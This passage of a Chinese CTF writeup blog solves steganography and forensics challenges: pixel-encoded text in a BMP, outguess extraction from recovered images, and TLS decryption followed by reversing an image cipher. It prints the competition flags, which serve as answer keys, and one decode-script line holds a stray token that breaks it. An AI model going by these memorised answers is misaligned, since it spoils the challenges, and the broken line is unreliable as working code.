<p>然后得到zip的密码GWHT@R1nd0yyds然后解压得到bmp文件同时根据提示得到一个加密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import math</span><br><span class="line">def encode(text):</span><br><span class="line">    str_len = len(text)</span><br><span class="line">    width = math.ceil(str_len ** 0.5)</span><br><span class="line">    im = Image.new(&quot;RGB&quot;, (width, width), 0x0)</span><br><span class="line">    x, y = 0, 0</span><br><span class="line">    for i in text:</span><br><span class="line">        index = ord(i)</span><br><span class="line">        rgb = (0, (index &amp; 0xFF00) &gt;&gt; 8, index &amp; 0xFF)</span><br><span class="line">        im.putpixel((x, y), rgb)</span><br><span class="line">        if x == width - 1:</span><br><span class="line">            x = 0</span><br><span class="line">            y += 1</span><br><span class="line">        else:</span><br><span class="line">            x += 1</span><br><span class="line">    return im</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    with open(&quot;829962.txt&quot;, encoding=&quot;gbk&quot;) as f:</span><br><span class="line">        all_text = f.read()</span><br><span class="line">        im = encode(all_text)</span><br><span class="line">        im.save(&quot;out.bmp&quot;)</span><br></pre></td></tr></table></figure>

<p>根据上面的加密脚本得到解密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import math</span><br><span class="line"># if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">#     #(0, 101, 176)</span><br><span class="line">#     print((101&lt;&lt;8)+175)</span><br><span class="line">#     print(chr((101&lt;&lt;8)+175))</span><br><span class="line"># print(118&lt;&lt;8+244)</span><br><span class="line"># (0, 89, 22)</span><br><span class="line">#     for i in range(999999):</span><br><span class="line">#         if 371==math.ceil(i ** 0.5):</span><br><span class="line">#             print(i)# 136901-137641</span><br><span class="line"># 0x2233</span><br><span class="line"># 0x22</span><br><span class="line"># 0x33</span><br><span class="line"># 118&lt;&lt;8+244</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">img = Image.open(&#x27;out.bmp&#x27;)  # 371*371</span><br><span class="line">height = img.size[0]</span><br><span class="line"># print(img.size)</span><br><span class="line">width = img.size[1]</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for x in range(height):</span><br><span class="line">    for y in range(width):</span><br><span class="line">        pixel = img.getpixel((y,x))</span><br><span class="line">        # print(pixel)</span><br><span class="line">        # print(pixel[0],pixel[1],pixel[2])</span><br><span class="line">        # print(chr((pixel[1] &lt;&lt; 8) + pixel[2]))</span><br><span class="line">        flag += chr((pixel[1] &lt;&lt; 8) + pixel[2])</span><br><span class="line">new=&quot; &quot;+flag+&quot; &quot;</span><br><span class="line">new=new.replace(&quot; &quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;,&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;\n&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;(&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;)&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;。&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;，&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;?&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;　　&quot;,&quot;&quot;)</span><br><span class="line">t=&quot;&quot;</span><br><span class="line">print(new)</span><br><span class="line">for i in range(len(new)):</span><br><span class="line">    if &quot;_&quot; == new[i]:</span><br><span class="line">        t+=new[i]+new[i+1]</span><br><span class="line">        print(new[i]+new[i+1])</span><br><span class="line">    if 32 &lt; ord(new[i]) &lt; 128:</span><br><span class="line">        if ord(new[i-1]) &gt; 129:</span><br><span class="line">           x if ord(new[i+1]) &gt; 129 :</span><br><span class="line">                t += new[i]</span><br><span class="line">                print(new[i-3:i+3],&quot;\t&quot;,new[i])</span><br><span class="line">            else:</span><br><span class="line">                pass</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">print(t)</span><br><span class="line">with open(&quot;829962.txt&quot;,&quot;w+&quot;, encoding=&quot;gbk&quot;) as f:</span><br><span class="line">    all_text = f.write(t)</span><br></pre></td></tr></table></figure>

<p>根据输出结果可以看到flag，然后过滤掉一些关键字符得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">与超越f阿德          f</span><br><span class="line">的意义l——          l</span><br><span class="line">比重快6岁的          6</span><br><span class="line">生来就a身体          a</span><br><span class="line">更好的g动机          g</span><br><span class="line">存在生&#123;理过          &#123;</span><br><span class="line">为重要h的方          h</span><br><span class="line">这孩子7岁时          7</span><br><span class="line">隐瞒了3年最          3</span><br><span class="line">像有某1种东          1</span><br><span class="line">的几步d心理          d</span><br><span class="line">表现由3于自          3</span><br><span class="line">_1</span><br><span class="line">我想是8年—          8</span><br><span class="line">说：“4岁时          4</span><br><span class="line">过夜她2岁时          2</span><br><span class="line">失踪了8天找          8</span><br><span class="line">里关了8天没          8</span><br><span class="line">一耳光n看到          n</span><br><span class="line">儿呆了8天因          8</span><br><span class="line">_t</span><br><span class="line">当时我3岁”          3</span><br><span class="line">让一个3岁小          3</span><br><span class="line">：“我3岁时          3</span><br><span class="line">比我大3岁的          3</span><br><span class="line">是家里5个孩          5</span><br><span class="line">著在我4岁左          4</span><br><span class="line">“记得4岁时          4</span><br><span class="line">嚅嚅低h语这          h</span><br><span class="line">话了有8周完          8</span><br><span class="line">事：“5岁时          5</span><br><span class="line">板整整5分钟          5</span><br><span class="line">的工作8年前          8</span><br><span class="line">上干了8年他          8</span><br><span class="line">孩子合3作的          3</span><br><span class="line">_p</span><br><span class="line">不会再1像那          1</span><br><span class="line">院呆了4年医          4</span><br><span class="line">每个小c孩的          c</span><br><span class="line">和一个3岁的          3</span><br><span class="line">予理会3岁大          3</span><br><span class="line">能成为t进行          t</span><br><span class="line">”：在4岁时          4</span><br><span class="line">个体心u理学          u</span><br><span class="line">的决定r并决          r</span><br><span class="line">只承担5年的          5</span><br><span class="line">“记得3岁时          3</span><br><span class="line">有一个4岁的          4</span><br><span class="line">利喂了7个月          7</span><br><span class="line">了直到3岁他          3</span><br><span class="line">是家里7个孩          7</span><br><span class="line">弟小时3候学          3</span><br><span class="line">是相差3年左          3</span><br><span class="line">右一个3岁的          3</span><br><span class="line">已经有8年之          8</span><br><span class="line">续说了8天而          8</span><br><span class="line">婚姻问&#125;题中          &#125;</span><br><span class="line">清楚到5岁时          5</span><br><span class="line">埃莉诺T格卢          T</span><br><span class="line">只给我5毛钱          5</span><br><span class="line">周只有5毛钱          5</span><br><span class="line">上一周5毛钱          5</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;h1d3_1n_th3_p1ctur3&#125;</span><br></pre></td></tr></table></figure>

<h3 id="迷失幻境"><a href="#迷失幻境" class="headerlink" title="迷失幻境"></a>迷失幻境</h3><p>FTK挂载之后使用diskgenius查看是一堆图片和一个可莉，同时在回收站中找到被删除的45，发现45文件头被破坏，修复文件头之后</p>
<p>跟任意一张环境Stegsolve合并之后得到key:可莉前来报道</p>
<p>回收站中还找到另一个图片，使用outguess 隐写得到flag，需要注意outguess执行的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k 可莉前来报道 -r RE4UUGI.jpg flag.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;f473a6fd2de17a0c5794414b3905ebbe&#125;</span><br></pre></td></tr></table></figure>

<h3 id="躲猫猫"><a href="#躲猫猫" class="headerlink" title="躲猫猫"></a>躲猫猫</h3><p>流量分析得到一个zip，根据这个zip可以分离出key.log和加密脚本，其中的key.log可以用来解密流量包中的tls流量，根据解密后的流量包可以得到一个jpg图片，图片中就是zip的密码，解压得到加密脚本，根据加密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">from numpy import array, zeros, uint8</span><br><span class="line">import cv2</span><br><span class="line">from secret import get_x_y</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">image = cv2.imread(&quot;cat.png&quot;)</span><br><span class="line">img_gray = cv2.cvtColor(image,cv2.COLOR_RGB2GRAY)</span><br><span class="line">imagearray = array(img_gray)</span><br><span class="line">h = len(imagearray)</span><br><span class="line">w = len(imagearray[0])</span><br><span class="line">x, y = get_x_y()</span><br><span class="line">#5999540678407978169965856946811257903979429787575580150595711549672916183293763090704344230372835328</span><br><span class="line">#6310149030391323406342737832910952782997118359318834776480172449836047279615976753524231989362688</span><br><span class="line">cmd = &quot;echo &#x27;%s\n%s&#x27; &gt; secret&quot; % (x, y)</span><br><span class="line">os.system(cmd)</span><br><span class="line"></span><br><span class="line">x1 = round(x/y*0.001, 16)</span><br><span class="line">u1 = y*3650/x</span><br><span class="line">x2 = round(x/y*0.00101, 16)</span><br><span class="line">u2 = y*3675/x</span><br><span class="line">x3 = round(x/y*0.00102, 16)</span><br><span class="line">u3 = y*3680/x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line"></span><br><span class="line">temp_image = zeros(shape=[h, w, 3], dtype=uint8)</span><br><span class="line">print(len(temp_image))</span><br><span class="line">print(len(temp_image[0]))</span><br><span class="line">print(len(temp_image[0][1]))</span><br><span class="line">for k in range(0, 1):</span><br><span class="line">    for i in range(0, h):</span><br><span class="line">        for j in range(0, w):</span><br><span class="line">            x1 = u1 * x1 * (1 - x1)</span><br><span class="line">            x2 = u2 * x2 * (1 - x2)</span><br><span class="line">            x3 = u3 * x3 * (1 - x3)</span><br><span class="line">            r1 = int(x1*255)</span><br><span class="line">            r2 = int(x2*255)</span><br><span class="line">            r3 = int(x3*255)</span><br><span class="line">            for t in range(0, 3):</span><br><span class="line">                temp_image[i][j][t] = (((r1+r2) ^ r3)+imagearray[i][j][t]) % 256</span><br><span class="line">    x1 = kt[0]</span><br><span class="line">    x2 = kt[1]</span><br><span class="line">    x3 = kt[2]</span><br><span class="line"></span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br><span class="line">encflagarray.save(&quot;missing_cat.png&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="./image/media/2022/ctf/2022.09/img/png.png"></p>
<p>然后根据加密脚本逆向得到解密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import numpy as np</span><br><span class="line">from numpy import array, zeros, uint8</span><br><span class="line">import cv2</span><br><span class="line"></span><br><span class="line">image = Image.open(&quot;png.png&quot;)</span><br><span class="line">re_img = np.asarray(image)</span><br><span class="line">x = 5999540678407978169965856946811257903979429787575580150595711549672916183293763090704344230372835328</span><br><span class="line">y = 6310149030391323406342737832910952782997118359318834776480172449836047279615976753524231989362688</span><br><span class="line">x1 = round(x / y * 0.001, 16)</span><br><span class="line">u1 = y * 3650 / x</span><br><span class="line">x2 = round(x / y * 0.00101, 16)</span><br><span class="line">u2 = y * 3675 / x</span><br><span class="line">x3 = round(x / y * 0.00102, 16)</span><br><span class="line">u3 = y * 3680 / x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line">temp_image = zeros(shape=[1800, 1800, 3], dtype=uint8)</span><br><span class="line">print(type(temp_image))</span><br><span class="line">for i in range(0, 1800):</span><br><span class="line">    for j in range(0, 1800):</span><br><span class="line">        x1 = u1 * x1 * (1 - x1)</span><br><span class="line">        x2 = u2 * x2 * (1 - x2)</span><br><span class="line">        x3 = u3 * x3 * (1 - x3)</span><br><span class="line">        r1 = int(x1 * 255)</span><br><span class="line">        r2 = int(x2 * 255)</span><br><span class="line">        r3 = int(x3 * 255)</span><br><span class="line">        for t in range(0, 3):</span><br><span class="line">            temp_image[i][j][t] = (re_img[i][j][t] - ((r1 + r2) ^ r3)) % 256</span><br><span class="line">            # print(temp_image[i][j][t]-((r1+r2) ^ r3))</span><br><span class="line">            # print((temp_image[i][j][t]-((r1+r2) ^ r3))%256)</span><br><span class="line"># img_gray = cv2.cvtColor(image,cv2.COLOR_RGB2GRAY)</span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br><span class="line">encflagarray.save(&quot;missing_cat.png&quot;)</span><br></pre></td></tr></table></figure>

<p>得到图片</p>
<p><img src="/image/media/2022/ctf/2022.09/img/cat.png"></p>
<p>可以看到类似是MAxicode，把中间的猫换成圆圈之后得到</p>
<p><img src="/image/media/2022/ctf/2022.09/img/flag.png"></p>
<p>手机扫码得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GWHT&#123;ozqgVLoI1DvK8giNVdvGslr_aZKKwNuv_q-FzqB5N3hHHqn3&#125;</span><br></pre></td></tr></table></figure>



</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://0314valen.github.io">Valen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0314valen.github.io/article/2022-10-01-2022%E5%B9%B49%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/">https://0314valen.github.io/article/2022-10-01-2022%E5%B9%B49%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://0314valen.github.io" target="_blank">Valen的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/writeup/">writeup</a></div><div class="post_share"><div class="social-share" data-image="http://api.btstu.cn/sjbz/" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/image/UI_images/alipay-reward-image.jpg" target="_blank"><img class="post-qr-code-img" src="/image/UI_images/alipay-reward-image.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/image/UI_images/alipay-reward-image.jpg" target="_blank"><img class="post-qr-code-img" src="/image/UI_images/alipay-reward-image.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/2022-11-01-2022%E5%B9%B410%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/"><img class="prev-cover" src="http://api.btstu.cn/sjbz/" onerror="onerror=null;src='/image/UI_images/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2022年10月比赛writeups</div></div></a></div><div class="next-post pull-right"><a href="/article/2022-09-26-MySql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"><img class="next-cover" src="https://imgsa.baidu.com/forum/pic/item/d52a2834349b033b40eff18517ce36d3d539bd0d.jpg" onerror="onerror=null;src='/image/UI_images/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">MySql数据库基础</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/article/2022-09-01-2022%E5%B9%B48%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/" title="2022年8月比赛writeups"><img class="cover" src="http://api.btstu.cn/sjbz/" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2022-11-10</div><div class="title">2022年8月比赛writeups</div></div></a></div><div><a href="/article/2022-11-01-2022%E5%B9%B410%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/" title="2022年10月比赛writeups"><img class="cover" src="http://api.btstu.cn/sjbz/" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2022-11-10</div><div class="title">2022年10月比赛writeups</div></div></a></div><div><a href="/article/2022-11-15-Solidity8.0-%E5%85%A5%E9%97%A8/" title="Solidity8.0-入门"><img class="cover" src="https://www.osgeo.cn/solidity/_static/logo.svg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2022-11-15</div><div class="title">Solidity8.0-入门</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/image/UI_images/avatar.jpg" onerror="this.onerror=null;this.src='/image/UI_images/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Valen</div><div class="author-info__description">一位精通各种环境的开启和附件的下载的签到型选手</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/0314Valen/0314Valen.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">不要担心辜负了别人的期待，对你有期待的，只有你自己。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022%E5%B9%B49%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups"><span class="toc-number">1.</span> <span class="toc-text">2022年9月比赛writeups</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2022%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B"><span class="toc-number">1.1.</span> <span class="toc-text">2022年第三届电信和互联网行业职业技能竞赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Broken-Radio"><span class="toc-number">1.1.1.</span> <span class="toc-text">Broken Radio</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#calc"><span class="toc-number">1.1.2.</span> <span class="toc-text">calc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eye"><span class="toc-number">1.1.3.</span> <span class="toc-text">eye</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%8D%E9%BE%99%E5%8D%81%E5%85%AB%E6%8E%8C"><span class="toc-number">1.1.4.</span> <span class="toc-text">降龙十八掌</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2022%E6%9C%9B%E5%B2%B3%E6%9D%AF"><span class="toc-number">1.2.</span> <span class="toc-text">2022望岳杯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#001MMS-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.1.</span> <span class="toc-text">001MMS 协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#003%E6%94%BB%E5%87%BB%E8%A1%8C%E4%B8%BA%E8%BF%98%E5%8E%9F"><span class="toc-number">1.2.2.</span> <span class="toc-text">003攻击行为还原</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#004%E7%95%99%E7%97%95%E5%8F%96%E8%AF%81"><span class="toc-number">1.2.3.</span> <span class="toc-text">004留痕取证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#005%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.4.</span> <span class="toc-text">005漏洞挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#006%E5%AF%86%E6%96%87%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.2.5.</span> <span class="toc-text">006密文破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2022%E7%BE%8A%E5%9F%8E%E6%9D%AF"><span class="toc-number">1.3.</span> <span class="toc-text">2022羊城杯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#where-is-secret"><span class="toc-number">1.3.1.</span> <span class="toc-text">where_is_secret</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%B7%E5%A4%B1%E5%B9%BB%E5%A2%83"><span class="toc-number">1.3.2.</span> <span class="toc-text">迷失幻境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BA%B2%E7%8C%AB%E7%8C%AB"><span class="toc-number">1.3.3.</span> <span class="toc-text">躲猫猫</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/article/2022-12-13-%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90volatility%E7%BA%AA%E8%A6%81/" title="取证分析volatility纪要"><img src="https://avatars.githubusercontent.com/u/6001145?s=200&amp;v=4" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="取证分析volatility纪要"/></a><div class="content"><a class="title" href="/article/2022-12-13-%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90volatility%E7%BA%AA%E8%A6%81/" title="取证分析volatility纪要">取证分析volatility纪要</a><time datetime="2022-12-12T16:00:00.000Z" title="发表于 2022-12-13 00:00:00">2022-12-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/2022-11-25-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%BA%AA%E8%A6%81/" title="博客搭建纪要"><img src="https://0314valen.github.io//image/UI_images/favicon.png" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="博客搭建纪要"/></a><div class="content"><a class="title" href="/article/2022-11-25-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%BA%AA%E8%A6%81/" title="博客搭建纪要">博客搭建纪要</a><time datetime="2022-11-24T16:00:00.000Z" title="发表于 2022-11-25 00:00:00">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/2021-11-23-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(ssti)/" title="模板注入(ssti)"><img src="https://img.paulzzh.tech/touhou/random" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="模板注入(ssti)"/></a><div class="content"><a class="title" href="/article/2021-11-23-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(ssti)/" title="模板注入(ssti)">模板注入(ssti)</a><time datetime="2022-11-21T02:15:19.351Z" title="发表于 2022-11-21 10:15:19">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/2022-11-15-Solidity8.0-%E5%85%A5%E9%97%A8/" title="Solidity8.0-入门"><img src="https://www.osgeo.cn/solidity/_static/logo.svg" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="Solidity8.0-入门"/></a><div class="content"><a class="title" href="/article/2022-11-15-Solidity8.0-%E5%85%A5%E9%97%A8/" title="Solidity8.0-入门">Solidity8.0-入门</a><time datetime="2022-11-14T16:00:00.000Z" title="发表于 2022-11-15 00:00:00">2022-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/article/2022-11-26-Solidity8.0-%E8%BF%9B%E9%98%B6/" title="Solidity8.0-入门"><img src="https://www.osgeo.cn/solidity/_static/logo.svg" onerror="this.onerror=null;this.src='/image/UI_images/404.jpg'" alt="Solidity8.0-入门"/></a><div class="content"><a class="title" href="/article/2022-11-26-Solidity8.0-%E8%BF%9B%E9%98%B6/" title="Solidity8.0-入门">Solidity8.0-入门</a><time datetime="2022-11-14T16:00:00.000Z" title="发表于 2022-11-15 00:00:00">2022-11-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By Valen</div><div 